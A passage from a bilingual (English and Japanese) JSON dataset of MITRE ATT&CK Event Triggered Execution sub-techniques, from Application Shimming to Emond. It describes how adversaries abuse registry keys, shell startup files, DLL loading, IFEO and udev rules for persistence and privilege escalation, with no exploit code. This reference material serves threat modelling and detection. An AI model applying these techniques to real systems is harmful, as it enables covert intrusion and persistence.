(sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
                        "description_jp": "攻撃者は、アプリケーションシムによって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。Microsoft Windows Application Compatibility Infrastructure/Framework（アプリケーションシム）は、オペレーティングシステムのコードベースが時とともに変化する中で、ソフトウェアの後方互換性を可能にするために作成されました。例えば、アプリケーションシム機能により、開発者はWindows XP用に作成されたアプリケーションに（コードを書き換えることなく）修正を適用し、Windows 10でも動作するようにすることができる。(引用：Elastic Process Injection 2017年7月号）\n\nフレームワーク内では、シムはプログラム（より具体的にはインポートアドレステーブル）とWindows OSの間のバッファとして機能するように作成されます。プログラムが実行されると、シムキャッシュが参照され、プログラムがシムデータベース（.sdb）の使用を必要とするかどうかが判断されます。もしそうであれば、シムデータベースはフッキングを使用して、OSと通信するために必要に応じてコードをリダイレクトします。\n\nデフォルトのWindowsインストーラー（sdbinst.exe）によって現在インストールされているすべてのシムのリストは、以下に保持されています：\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> および\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nカスタムデータベースは以下に保存されます：\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> および\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nシムの安全性を保つため、Windows はシムをユーザーモードで実行するように設計しているため、シムはカーネルを変更できず、シムをインストールするには管理者権限が必要です。しかし、特定のシムは[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1548/002)（UACおよびRedirectEXE）、プロセスへのDLLの注入（InjectDLL）、データ実行防止（DisableNX）および構造化例外処理（DisableSEH）の無効化、およびメモリアドレスの傍受（GetProcAddress）に使用できます。\n\nこれらのシムを利用することで、敵は特権の昇格、バックドアのインストール、Windows Defenderのような防御機能の無効化など、いくつかの悪意のある行為を実行できる可能性がある（引用：FireEye Application Shimming）。シムはまた、影響を受けるプログラムから継続的に呼び出されることで、永続性を確立するために悪用される可能性もある。"
                    },
                    {
                        "id": "T1546.015",
                        "name_eng": "Component Object Model Hijacking",
                        "name_jp": "コンポーネントオブジェクトモデルハイジャック",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
                        "description_jp": "攻撃者は、Component Object Model（COM）オブジェクトへのハイジャックされた参照をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。COM は、オペレーティング・システムを通じてソフトウェア・コンポーネント間の相互作用を可能にする Windows 内のシステムである（引用：Microsoft Component Object Model） 様々な COM オブジェクトへの参照は、レジストリに格納される。\n\n攻撃者は COM システムを利用し、永続化の手段として COM の参照とリレーションシップをハイジャックすることで、正当なソフトウェアの代わりに実行可能な悪意のあるコードを挿入することができます。COM オブジェクトをハイジャックするには、レジストリを変更し、正規のシステム・コンポーネントへの参照を置き換える必要があります。これにより、実行時にそのコンポーネントが機能しなくなる可能性があります。そのシステムコンポーネントが通常のシステム操作を通じて実行されると、代わりに攻撃者のコードが実行されます。(引用：GDATA COM Hijacking）敵対者は、一貫したレベルの永続性を維持するのに十分な頻度で使用されるオブジェクトをハイジャックする可能性が高いが、検知につながる可能性のあるシステムの不安定性を回避するため、システム内の顕著な機能を破壊する可能性は低い。"
                    },
                    {
                        "id": "T1546.004",
                        "name_eng": "Unix Shell Configuration Modification",
                        "name_jp": "Unixシェル設定変更",
                        "description_eng": "Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \n\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. \n\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",
                        "description_jp": "攻撃者は、ユーザのシェルによって引き起こされる悪意のあるコマンドを実行することで、永続性を確立することができる。ユーザーの[Unix Shell](https://attack.mitre.org/techniques/T1059/004)は、イベントに基づいてセッション中の異なる時点でいくつかの設定スクリプトを実行します。例えば、ユーザがコマンドラインインターフェースを開いたり、(SSH経由などで)リモートログインすると、ログインシェルが起動します。ログインシェルはシステム (<code>/etc</code>) とユーザーのホームディレクトリ (<code>~/</code>) からスクリプトを実行して環境を設定します。システム上のすべてのログインシェルは、起動時に /etc/profile を使用します。これらの設定スクリプトは、そのディレクトリの権限レベルで実行され、環境変数の設定、エイリアスの作成、ユーザー環境のカスタマイズによく使われます。シェルが終了または終了すると、シェルが適切に終了するように、追加のシェルスクリプトが実行されます。\n\n攻撃者は、シェルによって自動的に実行されるスクリプトにコマンドを挿入することで、永続性を確立しようとする場合がある。ほとんどのGNU/Linuxシステムのデフォルトシェルであるbashを例にとると、敵対者は悪意のあるバイナリを起動するコマンドを<code>/etc/profile</code>ファイルと<code>/etc/profile.d</code>ファイルに追加する可能性があります。(引用：intezer-kaiji-malware)(引用：bencane blog bashrc) これらのファイルは通常、変更するためにrootパーミッションを必要とし、システム上のシェルが起動するたびに実行されます。ユーザーレベルのパーミッションの場合、敵対者は悪意のあるコマンドを <code>~/.bash_profile</code>、<code>~/.bash_login</code>、<code>~/.profile</code> に挿入することができます。(引用: anomali-rocke-tactics)(Citation: Linux manual bash invocation) システムはリストされた順序で最初に存在するファイルのみを実行するので、敵対者は実行を確実にするために<code>~/.bash_profile</code>を使用してきました。敵はまた、リモートで接続が確立されたり、コマンドラインインターフェイスの新しいタブなど、追加の対話型シェルが開かれた場合に追加で実行される<code>~/.bashrc</code>ファイルも活用しています。(引用：Tsunami)(引用：anomali-rocke-tactics)(引用：anomali-linux-rabbit)(引用：Magento) 実行をトリガーするためにプログラムの終了をターゲットにするマルウェアもあり、敵対者は <code>~/.bash_logout</code> ファイルを使用して、セッションの終了時に悪意のあるコマンドを実行することができます。\n\nmacOSの場合、このテクニックの機能は似ていますが、macOS 10.15+のデフォルトシェルであるzshを活用する可能性があります。Terminal.appを開くと、アプリケーションはzshログインシェルとzsh対話シェルを起動します。ログインシェルは、<code>/etc/profile</code>、<code>/etc/zshenv</code>、<code>/etc/zprofile</code>、<code>/etc/zlogin</code>を使用してシステム環境を設定します。(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) ログインシェルは、<code>~/.zprofile</code>と<code>~/.zlogin</code>でユーザー環境を設定します。対話型シェルは <code>~/.zshrc</code> を使ってユーザー環境を設定します。終了時には、<code>/etc/zlogout</code>と<code>~/.zlogout</code>が実行されます。レガシープログラムでは、macOSは起動時に<code>/etc/bashrc</code>を実行する。"
                    },
                    {
                        "id": "T1546.010",
                        "name_eng": "AppInit DLLs",
                        "name_jp": "AppInit DLL",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
                        "description_jp": "攻撃者は、プロセスにロードされた AppInit DLL をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。レジストリキー <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> または <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> の <code>AppInit_DLLs</code> 値で指定されているダイナミックリンクライブラリ (DLL) は、user32.dll をロードするすべてのプロセスにロードされます。dllは、user32.dllをロードするすべてのプロセスにロードされる。user32.dllは非常に一般的なライブラリであるため、実際にはほとんどすべてのプログラムにロードされます。(引用：Elastic Process Injection 2017年7月号）\n\n[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値を悪用して悪意のあるDLLをロードさせ、コンピュータ上の別のプロセスのコンテキストで実行させることで、昇格した特権を取得することができます。(引用：AppInit Registry） また、悪意のあるAppInit DLLは、APIアクティビティによって継続的にトリガーされることで、永続性を提供する可能性もある。\n\nWindows 8 以降のバージョンでは、セキュアブートが有効になっている場合、AppInit DLL の機能は無効になります。(引用：AppInit セキュアブート）"
                    },
                    {
                        "id": "T1546.005",
                        "name_eng": "Trap",
                        "name_jp": "トラップ",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",
                        "description_jp": "攻撃者は、割り込みシグナルをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立することができる。<code>trap</code>コマンドは、プログラムやシェルが割り込みシグナルを受信したときに実行されるコマンドを指定できるようにします。よくある状況は、<code>ctrl+c</code> や <code>ctrl+d</code>のような一般的なキーボード割り込みの優雅な終了と処理を可能にするスクリプトです。\n\n攻撃者はこれを利用して、シェルが特定の割り込みに遭遇したときに実行するコードを、永続化メカニズムとして登録することができる。トラップコマンドは以下の形式である。 <code>trap 'command list' signals</code> ここで、「command list」は「signals」を受信したときに実行される。(引用：トラップマニュアル)(引用：Cyberciti Trap Statements)"
                    },
                    {
                        "id": "T1546.007",
                        "name_eng": "Netsh Helper DLL",
                        "name_jp": "NetshヘルパーDLL",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
                        "description_jp": "攻撃者は、Netsh Helper DLL によって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。Netsh.exe (Netshell とも呼ばれる) は、システムのネットワーク構成と対話するために使用されるコマンドライン スクリプト ユーティリティです。このユーティリティには、ユーティリティの機能を拡張するためのヘルパー DLL を追加する機能が含まれています (引用: TechNet Netsh)。登録された netsh.exe ヘルパー DLL へのパスは、Windows レジストリの <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> に入力されます。\n\n攻撃者は、netsh.exeヘルパーDLLを使用して、任意のコードを持続的に実行させることができる。この実行は、netsh.exeが実行されればいつでも行われることになり、自動的、別の永続化手法、または通常の機能の一部としてnetsh.exeを実行する他のソフトウェア（例：VPN）がシステム上に存在する場合に発生する可能性がある。(引用：Github Netsh Helper CS Beacon）（引用：Demaske Netsh Persistence）。"
                    },
                    {
                        "id": "T1546.012",
                        "name_eng": "Image File Execution Options Injection",
                        "name_jp": "イメージファイル実行オプションインジェクション",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                        "description_jp": "攻撃者は、イメージファイル実行オプション（IFEO）デバッガによって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。IFEO は、開発者がアプリケーションにデバッガをアタッチすることを可能にします。プロセスが作成されると、アプリケーションの IFEO に存在するデバッガーがアプリケーション名の前に追加され、デバッガーの下で新しいプロセスが効果的に起動されます (例: <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>)。(引用: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOは、レジストリを介して直接設定するか、GFlagsツールを介してグローバルフラグに設定することができます。(引用: Microsoft GFlags Mar 2017) IFEO は、レジストリの <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> の <code>Debugger</code> 値として表され、<code>&lt;executable&gt;</code> はデバッガーがアタッチされているバイナリです。(引用：Microsoft Dev Blog IFEO Mar 2010）\n\nIFEO を使用すると、指定したプログラムがサイレント終了 (それ自身または 2 番目の非カーネル モード プロセスによって早期終了) したときに、任意のモニター プログラムを起動することもできます。(引用: Microsoft Silent Process Exit NOV 2017) (引用: Oddvar Moe IFEO APR 2018) デバッガーと同様に、サイレント終了監視は、GFlags を通して、または <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>のIFEOおよびサイレント終了レジストリ値を直接変更することによって有効にすることができます。(引用：Microsoft Silent Process Exit NOV 2017）（引用：Oddvar Moe IFEO APR 2018）\n\n[アクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)と同様に、Windows Vista以降およびWindows Server 2008以降では、「cmd.exe」またはバックドアアクセスを提供する別のプログラムを、アクセシビリティプログラム(ex: utilman.exe)の「デバッガ」として設定するレジストリキーが変更される可能性があります。レジストリが変更された後、キーボードを操作しているときにログイン画面で適切なキーの組み合わせを押すか、[リモート・デスクトップ・プロトコル](https://attack.mitre.org/techniques/T1021/001)で接続すると、「デバッガー」プログラムがSYSTEM権限で実行されるようになります。(引用：ティルベリー2014）\n\n[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値を悪用して、悪意のある実行ファイルをコンピュータ上の別のプロセスのコンテキストで読み込ませて実行させることで、特権の昇格を得ることもできます。(引用: Elastic Process Injection July 2017) IFEO メカニズムをインストールすることは、継続的なトリガー呼び出しによって永続性を提供する可能性もある。\n\nまた、マルウェアはIFEOを使用して、様々なシステムやセキュリティアプリケーションをリダイレクトし、効果的に無効にする無効なデバッガを登録することで、[防御の阻害](https://attack.mitre.org/techniques/T1562)を行う可能性があります。(引用：FSecure Hupigon) (引用：Symantec Ushedix June 2008)"
                    },
                    {
                        "id": "T1546.001",
                        "name_eng": "Change Default File Association",
                        "name_jp": "デフォルトのファイル関連付けの変更",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
                        "description_jp": "攻撃者は、ファイルタイプの関連付けをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立する可能性がある。ファイルを開くと、そのファイルを開くために使用されるデフォルトのプログラム（ファイルの関連付けまたはハンドラとも呼ばれる）がチェックされる。ファイルの関連付けの選択は Windows レジストリに保存され、レジストリにアクセスできるユーザー、管理者、プログラム、または管理者が組み込みの assoc ユーティリティを使用して編集することができます。(引用: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) アプリケーションは、指定された拡張子のファイルが開かれたときに任意のプログラムを呼び出すように、指定された拡張子のファイルの関連付けを変更することができます。\n\nシステムファイルの関連付けは、<code>HKEY_CLASSES_ROOT\\.[extension]</code>の下にリストされており、例えば<code>HKEY_CLASSES_ROOT\\.txt</code>のようになる。エントリは、<code>HKEY_CLASSES_ROOT\\\\[handler]</code>にあるその拡張のハンドラを指す。そして、様々なコマンドは、<code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>にあるシェルキーの下のサブキーとしてリストされる。例えば：\n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\n列挙されたキーの値は、ハンドラーがファイル拡張子を開いたときに実行されるコマンドである。攻撃者はこれらの値を変更することで、任意のコマンドを継続的に実行することができます。(引用: TrendMicro TROJ-FAKEAV OCT 2012)"
                    },
                    {
                        "id": "T1546.009",
                        "name_eng": "AppCert DLLs",
                        "name_jp": "AppCert DLL",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
                        "description_jp": "攻撃者は、プロセスにロードされたAppCert DLLをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code>下の<code>AppCertDLLs</code>レジストリキーで指定されるダイナミックリンクライブラリ（DLL）は、広く使用されているアプリケーションプログラミングインターフェース（API）関数<code>CreateProcess</code>、<code>CreateProcessAsUser</code>、<code>CreateProcessWithLoginW</code>、<code>CreateProcessWithTokenW</code>、または<code>WinExec</code>を呼び出すすべてのプロセスにロードされます。(引用：Elastic Process Injection 2017年7月号）\n\n[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、この値を悪用して、悪意のあるDLLをロードさせ、コンピュータ上の別のプロセスのコンテキストで実行させることで、昇格した特権を取得することができます。また、悪意のあるAppCert DLLは、APIアクティビティによって継続的にトリガーされることで、永続性を提供する可能性もある。"
                    },
                    {
                        "id": "T1546.017",
                        "name_eng": "Udev Rules",
                        "name_jp": "Udevルール",
                        "description_eng": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)",
                        "description_jp": "攻撃者は、udev ルールを使用してトリガーされた悪意のあるコンテンツを実行することで、永続性を維持する可能性があります。Udev は Linux カーネルのデバイス・マネージャーで、デバイス・ノードを動的に管理し、`/dev` ディレクトリにある擬似デバイス・ファイルへのアクセスを処理し、ハード・ドライブやキーボードなどの外部デバイスが接続されたり取り外されたりしたときのようなハードウェア・イベントに応答します。Udev は `match キー` でハードウェアイベントが満たすべき条件を指定し、`action キー` でその後のアクションを定義するルールファイルを使用する。`/etc/udev/rules.d/`、`/run/udev/rules.d/`、`/usr/lib/udev/rules.d/`、`/usr/local/lib/udev/rules.d/`、`/lib/udev/rules.d/` にあるルールファイルを作成、変更、削除するには root 権限が必要です。ルールの優先順位は、ディレクトリと、ルールファイル名に含まれる数字のプレフィックスによって決まる。(引用: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)\n\n攻撃者は、悪意のあるコンテンツを実行するためにudevルールファイルにルールを追加または変更することで、udevサブシステムを悪用する可能性があります。例えば、敵は `/dev/random` のような疑似デバイスファイルがアプリケーションによってアクセスされるたびに、自分のバイナリを実行するようにルールを設定するかもしれません。udevは短いタスクの実行に制限されており、systemd-udevdのサンドボックス（ネットワークとファイルシステムへのアクセスをブロック）によって制限されていますが、攻撃者はアクションキー`RUN+=`の下でスクリプトコマンドを使用して、これらの制御をバイパスするためにバックグラウンドで悪意のあるコンテンツのプロセスを切り離して実行することができます（引用：Reichert aon sedexp 2024）。"
                    },
                    {
                        "id": "T1546.014",
                        "name_eng": "Emond",
                        "name_jp": "Emond",
                        "description_eng": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",
